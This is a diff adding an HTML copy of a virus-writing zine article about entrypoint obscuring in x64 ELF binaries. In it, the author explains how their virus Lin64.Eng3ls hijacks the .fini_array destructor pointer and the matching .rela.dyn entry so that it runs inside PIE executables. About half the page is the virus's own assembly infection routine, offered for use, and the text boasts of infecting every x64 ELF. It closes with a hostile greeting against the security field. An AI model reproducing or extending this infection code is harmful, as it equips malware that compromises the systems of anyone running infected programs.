@@ -1,0 +1,135 @@
+<html>
+<head>
+<title>A short note on entrypoint obscuring in ELF binaries</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<div class="txtdiv"><pre>
+                ___________                              __
+                \__    ___/____ ______      ____  __ ___/  |_
+                  |    | /     \\____ \    /  _ \|  |  \   __\
+                  |    ||  Y Y  \  |_&gt; &gt;  (  &lt;_&gt; )  |  /|  |
+                  |____||__|_|  /   __/ /\ \____/|____/ |__|
+                              \/|__|    \/
+
++----------------------------------------------------------------------------+
+|::::::::::| A short note on entrypoint obscuring in ELF binaries |::::::::::|
++----------------------------------------------------------------------------+
+
+With love, by s01den.
+
+--------------------------------------------------------------------------------
+In the previous zine, Sblip and I presented you a virus we wrote, Lin64.Eng3ls,
+infecting x64 ELF. This virus implemented some fancy anti-RE techniques such as
+simple encryption, entrypoint obscuring (EPO) and .init_array hijacking to 
+detect debuggers by pointing to a ptrace call.
+
+======================== Quick reminder from tmp.0ut #1 ========================
+In non-EPO viruses, the entrypoint of an infected program is modified to point 
+to the beginning of the virus, whereas in EPO viruses, the virus is called in 
+another way, whether by hiding a jump in the host's code or by, like here, 
+abusing a specificity of the executable file format.
+================================================================================
+
+In Eng3ls, the EPO was made by modifying the .fini_array section (which contains
+a pointer to the destructor) in order to make it point to the virus's first 
+instruction. However, at the time, we thought that this technique was only 
+working for non-PIE binaries, so Eng3ls couldn't infect a lot of files. We 
+simply didn't manage to make this technique working for PIE binaries.
+
+But some months after the releasing of Tmp.0ut #1, I started up the debugger to 
+solve this issue once and for all. The problem was that there is another place 
+where the pointer to the destructor is stored: an entry in the .rela.dyn 
+section. We just have to patch it with the address of the virus's first 
+instruction!
+
+--------------------------- CUT-HERE -----------------------------
+parse_shdr:
+  xor rcx, rcx
+  xor rdx, rdx
+  mov cx, word [rax+e_hdr.shnum]     ;  rcx contains the number of entries in the program header table
+  mov rbx, qword [rax+e_hdr.shoff]   ;  rbx contains the offset of the program header table
+  mov dx, word [rax+e_hdr.shentsize] ;  rdx contains the size of an entry in the program header table
+
+loop_shdr:
+  add rbx, rdx
+  dec rcx
+  cmp dword [rax+rbx+e_shdr.type], 0x0F ; 0x0F = SHT_FINI_ARRAY, the section we're looking to modify to EPO (.fini_array)
+  je dtor_found
+  cmp rcx, 0
+  jg loop_shdr
+
+dtor_found:
+  mov rdi, qword [rax+rbx+e_shdr.offset]
+  mov r12, qword [rax+rdi]
+
+  xor rcx, rcx
+  xor rdx, rdx
+  mov cx, word [rax+e_hdr.shnum]     ; rcx contains the number of entries in the program header table
+  mov rbx, qword [rax+e_hdr.shoff]   ; rbx contains the offset of the program header table
+  mov dx, word [rax+e_hdr.shentsize] ; rdx contains the size of an entry in the program header table
+  loop_shdr_2:
+    add rbx, rdx
+    dec rcx
+    cmp dword [rax+rbx+e_shdr.type], 0x04 ; 0x04 = SHT_RELA, we need to modify an entry of this section in order to make the EPO working
+    je rela_dyn_found
+    cmp rcx, 0
+    jg loop_shdr_2
+
+  ; compute the address differently if the ELF is PIE or not
+  check_pie:
+    pop rdi
+    cmp word [rax+e_hdr.type], 2
+    je check_non_pie
+    cmp qword [rax+rdi], 0x00006000
+    jng continue_infect
+    mov rdi, r8
+    mov rax, 3            ; close
+    syscall
+    mov rsp, rbp
+    ret
+
+  check_non_pie:
+    cmp qword [rax+rdi], 0x0c000000
+    jng continue_infect
+    mov rdi, r8
+    mov rax, 3            ; close
+    syscall
+    mov rsp, rbp
+    ret
+
+  ; called when we found the .rela.dyn section
+  rela_dyn_found:
+    push rdi
+    mov rdi, qword [rax+rbx+e_shdr.offset]
+    xor rcx, rcx
+    .loop:
+      lea rbx, [rdi+rcx*8]
+      mov r10, qword [rax+rbx] ; r10 contains an addr we obtain by parsing the section
+      cmp r10, r12 ; r12 contains the addr stored in .fini_array (before our modifications)
+      jne .continue ; loop until we find the right addr to modify
+      mov qword [rax+rbx], r9 ; when we find it, we replace it with the virus's EP
+      mov rcx,0xf
+      .continue:
+      inc rcx
+      cmp rcx, 0x10
+      jne .loop
+    jmp check_pie
+
+  continue_infect:
+  mov [rax+rdi], r9 ; we write the virus's EP in .fini_array
+  ;           ...
+  ; apply the modifications
+--------------------------------------------------------------------------------
+
+Now we can infect every x64 ELF, PIE or not, with EPO!
+Every? Not exactly... We'll see that in the next issue!
+
+Have a good day!
+
+------&gt; Greetz to:
+Sblip, TMZ, netsp00ky, smelly, the tmp.0ut crew, Sh4ll, 0kb, Xylit0l and all the
+others persons who keep the underground mind!
+Fuck infosec and all the capitalists pigs.
+</pre></body></html>
